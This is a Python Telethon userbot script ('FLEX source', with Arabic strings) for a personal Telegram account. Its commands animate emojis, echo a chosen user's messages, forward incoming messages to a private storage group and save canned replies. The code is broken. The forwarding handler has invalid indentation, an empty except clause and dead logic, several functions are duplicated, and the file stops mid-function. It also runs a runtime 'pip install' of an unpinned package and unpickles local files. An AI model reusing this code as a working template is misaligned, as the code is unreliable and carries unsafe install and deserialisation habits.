import os
os.system("pip install mention")

from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import MessageNotModifiedError, FloodWaitError
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from telethon.errors import UserAdminInvalidError, ChatAdminRequiredError
from telethon import events, functions
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import User
from telethon.types import InputWebDocument
from telethon.errors import MediaEmptyError, WebpageMediaEmptyError, WebpageCurlFailedError
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.types import InputMediaDice
from telethon.tl.types import InputMessagesFilterDocument
from telethon.utils import get_input_photo
from telethon import functions, events
from telethon.tl.functions.messages import EditMessageRequest
from telethon.tl.types import ChannelParticipantsAdmins, UserStatusEmpty, UserStatusLastMonth, UserStatusLastWeek, UserStatusRecently, UserStatusOnline
from telethon.tl.types import InputPeerUser, InputPeerChannel
from telethon.errors.rpcerrorlist import PeerIdInvalidError
from pySmartDL import SmartDL
from telethon.tl.types import MessageActionChannelMigrateFrom
from telethon import events, Button
from queue import Queue
from telethon.sync import functions
from telethon.tl.types import InputChatUploadedPhoto
from user_agent import generate_user_agent
from telethon import events, functions, sync
from telethon.tl.functions.channels import CreateChannelRequest, EditPhotoRequest
from telethon.tl.functions.messages import ForwardMessagesRequest
from telethon.tl.types import PeerChannel, PeerUser
from telethon.errors import RPCError
from threading import Thread
from telethon.tl.functions.messages import ReportSpamRequest
from telethon import types
from telethon.tl import functions
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.events import NewMessage
from telethon import events 
from telethon.tl.types import InputPeerChat
from telethon import errors
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.types import MessageMediaPhoto
from telethon.tl.types import MessageMediaDocument
from telethon import events, functions, utils
from telethon.tl import functions, types
from telethon.tl.types import InputChannel
from deep_translator import GoogleTranslator
from telethon import TelegramClient, events
from telethon.tl.types import ChannelParticipantsAdmins        
from telethon.errors import ChannelInvalidError
from langdetect import detect  
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.functions.channels import EditTitleRequest
from datetime import datetime
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.errors.rpcerrorlist import (
    StickerMimeInvalidError, 
    PhotoExtInvalidError, 
    PhotoCropSizeSmallError, 
    ImageProcessFailedError )
from telethon import TelegramClient, events
from telethon import TelegramClient, events, sync 
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from gpytranslate import Translator
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import InputPhoto
from telethon.tl.functions.channels import EditPhotoRequest
from telethon import events
from telethon import functions
from telethon.tl.functions.messages import GetFullChatRequest
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import MessageIdInvalidError
from telethon import events, functions, types
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from datetime import datetime
from sqlalchemy import create_engine
from telethon.tl.types import InputMessagesFilterDocument, InputMessagesFilterPhotos
from asyncio import sleep
from sqlalchemy.orm import sessionmaker
from datetime import datetime, timedelta
from telethon.tl.types import Channel, Chat
from emoji import emojize
from datetime import datetime
from telethon.tl.custom import Button
from math import sqrt
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import WebpageMediaEmptyError
from telethon.tl.functions.messages import DeleteMessagesRequest
import sys
import pytz
import asyncio
import os
import datetime as dt
import base64
import events
import platform
from telethon import version as telethon_version
from telethon import events
from ping3 import ping
import pickle
import string
import re
import json
import mention
import requests
import io
import pybase64
import aiohttp
import random
import threading
import html
import telethon
import logging
import shutil
import time
from PIL import Image
from telethon.tl.functions.messages import GetStickerSetRequest

from telethon.sync import TelegramClient
os.system("clear")
print("""\033[031m
‚†Ä‚†Ä‚†Ä‚††‚£§‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£§‚£§‚†§‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚¢à‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚¢†‚£¥‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ø‚£ø‚£∑‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢Ä‚£¥‚£ø‚°∑‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚£ø‚£ø‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£æ‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£ø‚£ø‚£ø‚£ß‚†Ä‚†Ä‚†Ä‚†ò‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚°á‚†Ä‚†Ä‚†Ä‚¢Ä‚£º‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†π‚£ø‚£ø‚£ø‚£∑‚£¶‚£Ñ‚°Ä‚£ø‚£±‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚¢ø‚£ß‚£†‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†à‚†õ‚¢∑‚£ø‚£ü‚°ø‚†ø‚†ø‚°ü‚£ì‚£í‚£õ‚°õ‚°õ‚¢ü‚£õ‚°õ‚†ü‚†ø‚£ª‚¢ø‚£ø‚£ª‚°ø‚†õ‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚¢†‚£¥‚¢ª‚°≠‚†ñ‚°â‚†•‚£à‚†Ä‚£ê‚†Ç‚°Ñ‚†î‚¢Ç‚¢¶‚°π‚¢¨‚°ï‚†ä‚†≥‚†à‚¢ø‚£≥‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢Ä‚£º‚£∑‚£ã‚†≤‚¢Æ‚£Å‚†Ä‚£ê‚†Ü‚°§‚¢ä‚£ú‚°Ä‚°æ‚£Ä‚†Ä‚¢†‚¢ª‚£å‚£§‚£•‚£ì‚£å‚¢ª‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢∞‚£ü‚£Ω‚¢≥‚£Ø‚£ù‚£¶‚°Ä‚†ì‚°§‚¢Ü‚†á‚†Ç‚†Ñ‚†§‚°ù‚£Ç‚†ã‚†ñ‚¢ã‚†Ä‚£°‚£∂‚£æ‚°ø‚°∑‚£Ω‚°ø‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢∏‚£ø‚°ú‚¢Ø‚£ø‚£ø‚£ø‚£∑‚£ø‚£§‚£ß‚£∂‚£¨‚£ù‚£É‚£ì‚£à‚£•‚£∂‚£ø‚£æ‚£ø‚£ø‚¢£‚†á‚¢ª‚°û‚£Ø‚£π‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢ª‚£º‚£Ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚°î‚°Ø‚¢ß‚¢ü‚£ü‚£±‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£øFLEX ùó¶ùó¢ùó®ùó•ùóñùóò‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚°º‚°º‚¢Å‚°å‚¢º‚°ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ø‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚£ø‚¢á‚°º‚¢É‚°ø‚£º‚£õ‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚£ß‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ø‚†ü‚£°‚£´‚£¢‚¢è‚£º‚°µ‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚¢∏‚£ø‚£è‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ø‚£ø‚°æ‚¢ï‚£ª‚£Ω‚£µ‚†ø‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†ò‚¢∑‚£Æ‚£ø‚°º‚¢≠‚°ü‚†≥‚†û‚°ñ‚¢õ‚£∂‚£∑‚£Ø‚°∂‚†ü‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†â‚†õ‚†õ‚†õ‚†ø‚†ü‚†õ‚†õ‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
ùêÉùêûùêØ: @nS_R_T
""")

api_id = os.environ.get("API_ID", None)
api_hash = os.environ.get("API_HASH", None)
session_string = os.environ.get("STRING_SESSION", None)

session_name = 'hunter source'
response_file = 'responss.pkl'
published_messages_file = 'publihed_messages.pkl'
muted_users_file = 'mute_usrs.pkl'
time_update_status_file = 'time_pdate_status.pkl'
channel_link_file = 'channel_lnk.pkl'
image_folder = 'path_to_image_older'
response_file = 'path_to_respons_file'
last_message_time_file = 'path_to_last_esage_time_file'
last_message_id_file = 'path_to_last_mesage_id_file'
responses = {}
user_last_message_time = {}
user_last_message_id = {}
user_last_message_time_sent = {}
active_publishing_tasks = {}
image_folder = "iage"
if not os.path.exists(image_folder):
    os.makedirs(image_folder)
    
client = TelegramClient(StringSession(session_string), int(api_id), api_hash)
client.start()

if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)
else:
    responses = {}

if os.path.exists(channel_link_file):
    with open(channel_link_file, 'rb') as f:
        channel_link = pickle.load(f)
else:
    channel_link = None


if os.path.exists(time_update_status_file):
    with open(time_update_status_file, 'rb') as f:
        time_update_status = pickle.load(f)
else:
    time_update_status = {'enabled': False}


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = {}



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)
else:
    responses = {}

if os.path.exists(published_messages_file):
    with open(published_messages_file, 'rb') as f:
        published_messages = pickle.load(f)
else:
    published_messages = []


active_timers = {}
countdown_messages = {}


image_path = 'local_image.jpg'


account_name = None

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖÿ™ÿ™'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['ü§£', 'üòÇ', 'üòπ', 'ü§£', 'üòÇ', 'üòπ']
    
    message = await event.respond('ü§£üòÇüòπü§£üòÇüòπ')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break


mimic_user_id = None


@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸÇŸÑŸäÿØ'))
async def set_mimic_user(event):
    global mimic_user_id
    if event.is_reply:
        
        reply_message = await event.get_reply_message()
        mimic_user_id = reply_message.sender_id
        await event.edit(f"**‚éô ÿ≥Ÿäÿ™ŸÖ ÿ™ŸÇŸÑŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ {mimic_user_id}.**")
        await event.delete()
    else:
        await event.edit("**‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ¥ÿÆÿµ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØ ÿ™ŸÇŸÑŸäÿØŸá.**")


@client.on(events.NewMessage())
async def mimic_user(event):
    global mimic_user_id
    if mimic_user_id and event.sender_id == mimic_user_id:
        
        await client.send_message(event.chat_id, event.text)


@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ŸÇŸÑŸäÿØ'))
async def stop_mimic(event):
    global mimic_user_id
    mimic_user_id = None
    await event.edit("**‚éâ‚ïéÿ™ŸÖ ÿßŸäŸÄŸÇŸÄÿßŸÅ ÿßŸÑŸÄÿ™ŸÄŸÇŸÄŸÑŸÄŸäŸÄÿØ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è.**")
    await event.delete()
    
@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÜÿ™ÿ≠ÿßÿ±'))
async def suicide_message(event):
    await event.delete()
    
    
    message = await event.respond("**ÿ¨ÿßÿ±Ÿä ÿßŸÑÿßŸÜÿ™ÿ≠ÿßÿ± .....**")
    
    
    await asyncio.sleep(3)
    
    
    final_message = (
        "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™ÿ≠ÿßÿ± ÿ®ŸÜÿ¨ÿßÿ≠üòÇ...\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ|\n"
        "„ÄÄÔºèÔø£Ôø£Ôºº| \n"
        "Ôºú ¬¥ÔΩ• „ÄÄ„ÄÄ |Ôºº \n"
        "„ÄÄ|„ÄÄÔºì„ÄÄ | ‰∏∂Ôºº \n"
        "Ôºú „ÄÅÔΩ•„ÄÄ„ÄÄ|„ÄÄ„ÄÄÔºº \n"
        "„ÄÄÔººÔºøÔºøÔºè‚à™ _ ‚à™) \n"
        "„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ Ôºµ Ôºµ"
    )
    
    await message.edit(final_message)

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ¥ÿ±Ÿäÿ±'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['üòà', 'üíÄ', 'üëø', 'üî™', '‚ò†Ô∏è', 'üëπ']
    
    message = await event.respond('üëøüíÄüëπüëøüî™‚ò†Ô∏è')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ'))
async def add_group(event):
    await event.delete()
    try:
        if event.is_group:
            await event.reply(f"**‚éô ÿßŸÑŸÉÿ±Ÿàÿ® ŸÖŸàÿ¨ŸàÿØ ÿ®ÿßŸÑŸÅÿπŸÑ. ÿ≥Ÿäÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑŸÉŸàÿØ ŸÅŸä ÿßŸÑŸÉÿ±Ÿàÿ® ÿßŸÑÿ≥ÿßÿ®ŸÇ.**")
        elif event.is_private:
            # ÿßÿ≥ŸÖ ÿßŸÑÿµŸàÿ±ÿ© ÿßŸÑŸÖŸàÿ¨ŸàÿØÿ© ŸÅŸä ŸÜŸÅÿ≥ ÿßŸÑŸÖÿ¨ŸÑÿØ
            photo_name = "flex.jpg"  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ Ÿáÿ∞ÿß ÿ®ÿßÿ≥ŸÖ ŸÖŸÑŸÅ ÿßŸÑÿµŸàÿ±ÿ© ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ
            
            if os.path.exists('group_id.pkl'):
                with open('group_id.pkl', 'rb') as f:
                    group_id = pickle.load(f)
                try:
                    await client.get_entity(group_id)
                    await event.reply(f"**‚éô ÿßŸÑŸÉÿ±Ÿàÿ® ŸÖŸàÿ¨ŸàÿØ ÿ®ÿßŸÑŸÅÿπŸÑ. ÿ≥Ÿäÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑŸÉŸàÿØ ŸÅŸä ÿßŸÑŸÉÿ±Ÿàÿ® ÿßŸÑÿ≥ÿßÿ®ŸÇ.**")
                except ValueError:
                    os.remove('group_id.pkl')
                    group_name = "ŸÉÿ±Ÿàÿ® ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ"
                    group_bio = "ŸÉÿ±Ÿàÿ® ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑŸÖÿÆÿµÿµ ŸÖŸÜ ÿ≥Ÿàÿ±ÿ≥ flex"
                    group = await client(CreateChannelRequest(
                        title=group_name,
                        about=group_bio,
                        megagroup=True
                    ))
                    group_id = group.chats[0].id
                    
                    # ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿµŸàÿ±ÿ© ŸÖŸÜ ŸÜŸÅÿ≥ ŸÖÿ¨ŸÑÿØ ÿßŸÑÿ≥Ÿàÿ±ÿ≥
                    if os.path.exists(photo_name):
                        try:
                            uploaded_photo = await client.upload_file(photo_name)
                            await client(EditPhotoRequest(
                                channel=group_id,
                                photo=InputChatUploadedPhoto(
                                    file=uploaded_photo,
                                    video=None,
                                    video_start_ts=None
                                )
                            ))
                        except Exception as photo_error:
                            print(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿπŸÜÿØ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿµŸàÿ±ÿ©: {str(photo_error)}")
                    else:
                        print(f"‚éô ŸÖŸÑŸÅ ÿßŸÑÿµŸàÿ±ÿ© {photo_name} ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ")
                    
                    with open('group_id.pkl', 'wb') as f:
                        pickle.dump(group_id, f)
                    await event.reply(f"**‚éô ÿ™ŸÖ ÿ•ŸÜÿ¥ÿßÿ° ŸÉÿ±Ÿàÿ® ÿ¨ÿØŸäÿØ Ÿàÿ™ÿπŸäŸäŸÜŸá ŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿÆÿßÿµÿ©**")
            else:
                group_name = "ŸÉÿ±Ÿàÿ® ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ"
                group_bio = "ŸÉÿ±Ÿàÿ® ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑŸÖÿÆÿµÿµ ŸÖŸÜ ÿ≥Ÿàÿ±ÿ≥ flex"
                group = await client(CreateChannelRequest(
                    title=group_name,
                    about=group_bio,
                    megagroup=True
                ))
                group_id = group.chats[0].id
                
                # ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿµŸàÿ±ÿ© ŸÖŸÜ ŸÜŸÅÿ≥ ŸÖÿ¨ŸÑÿØ ÿßŸÑÿ≥Ÿàÿ±ÿ≥
                if os.path.exists(photo_name):
                    try:
                        uploaded_photo = await client.upload_file(photo_name)
                        await client(EditPhotoRequest(
                            channel=group_id,
                            photo=InputChatUploadedPhoto(
                                file=uploaded_photo,
                                video=None,
                                video_start_ts=None
                            )
                        ))
                    except Exception as photo_error:
                        print(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿπŸÜÿØ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿµŸàÿ±ÿ©: {str(photo_error)}")
                else:
                    print(f"‚éô ŸÖŸÑŸÅ ÿßŸÑÿµŸàÿ±ÿ© {photo_name} ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ")
                
                with open('group_id.pkl', 'wb') as f:
                    pickle.dump(group_id, f)
                await event.reply(f"**‚éô ÿ™ŸÖ ÿ•ŸÜÿ¥ÿßÿ° ŸÉÿ±Ÿàÿ® ÿ¨ÿØŸäÿØ Ÿàÿ™ÿπŸäŸäŸÜŸá ŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿÆÿßÿµÿ©**")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")
@client.on(events.NewMessage(incoming=True))
async def forward_message(event):
    if os.path.exists('group_id.pkl'):
        with open('group_id.pkl', 'rb') as f:
            group_id = pickle.load(f)
    else:
        group_id = None
        if group_id:
            await client.forward_messages(group_id, event.message)
            sender = await event.get_sender()
            resalt = f"#ÿßŸÑÿ™ŸÄŸÄÿßŸÉŸÄŸÄÿßÿ™\n\n‚åî‚îäÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ : <code>{sender.first_name}</code>\n‚åî‚îäÿßŸÑÿ±ÿ≥ÿßŸÑÿ© : {event.message.message}\n‚åî‚îäÿ±ÿßÿ®ŸÄÿ∑ ÿßŸÑÿ±ÿ≥ŸÄÿßŸÑŸá : <a href='https://t.me/{sender.username}/{event.message.id}'>ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß</a>"
            await client.send_message(group_id, resalt, parse_mode="html", link_preview=False)
    elif event.is_group and group_id:
        if event.reply_to_msg_id:
            replied_message = await event.get_reply_message()
            reply_sender = await client.get_entity(replied_message.sender_id)
                await client.forward_messages(group_id, event.message)
                hmm = await event.get_chat()
                full = None
                try:
                    full = await event.client.get_entity(event.message.from_id)
                except Exception as e:
                messaget = None
                try:
                    messaget = await media_type(event)
                except BaseException:
                    messaget = None
                resalt = f"#ÿßŸÑÿ™ŸÄŸÄÿßŸÉŸÄŸÄÿßÿ™\n\n‚åî‚îäÿßŸÑŸÉŸÄŸÄÿ±Ÿàÿ® : <code>{hmm.title}</code>\n‚åî‚îäÿßŸÑŸÖŸÄÿ±ÿ≥ŸÄŸÑ : <a href='tg://user?id={full.id}'>{full.first_name}</a>\n"
                if messaget is not None:
                    resalt += f"‚åî‚îäÿßŸÑÿ±ÿ≥ŸÄŸÄÿßŸÑŸÄŸá : <code>{messaget}</code>\n"
                else:
                    resalt += f"‚åî‚îäÿßŸÑÿ±ÿ≥ŸÄŸÄÿßŸÑŸÄŸá : {event.message.message}\n"
                resalt += f"‚åî‚îäÿ±ÿßÿ®ŸÄÿ∑ ÿßŸÑÿ±ÿ≥ŸÄÿßŸÑŸá : <a href='https://t.me/c/{hmm.id}/{event.message.id}'>ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß</a>"
                await client.send_message(group_id, resalt, parse_mode="html", link_preview=False)

@client.on(events.NewMessage(from_users='me', pattern='.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ'))
async def disable_storage(event):
    await event.delete()
    try:
        if os.path.exists('group_id.pkl'):
            os.remove('group_id.pkl')
            await event.reply("**‚éô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿ®ŸÜÿ¨ÿßÿ≠.**")
        else:
            await event.reply("**‚éô ÿßŸÑÿ™ÿÆÿ≤ŸäŸÜ ÿ∫Ÿäÿ± ŸÖŸÅÿπŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")


signature = (
    " {response}\n\n"
)



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)


if os.path.exists(last_message_time_file):
    with open(last_message_time_file, 'rb') as f:
        user_last_message_time = pickle.load(f)


if os.path.exists(last_message_id_file):
    with open(last_message_id_file, 'rb') as f:
        user_last_message_id = pickle.load(f)


if os.path.exists('path_to_last_message_sent_time_file'):
    with open('path_to_last_message_sent_time_file', 'rb') as f:
        user_last_message_time_sent = pickle.load(f)


@client.on(events.NewMessage(from_users='me', pattern=r'\.524763'))
async def handler(event):
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, response = event.raw_text.split(' ', 1)
            response = response.strip()

            
            full_response = signature.format(response=response)

            
            responses['response'] = {
                'response': full_response,
                'photo': photo_path
            }
            
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
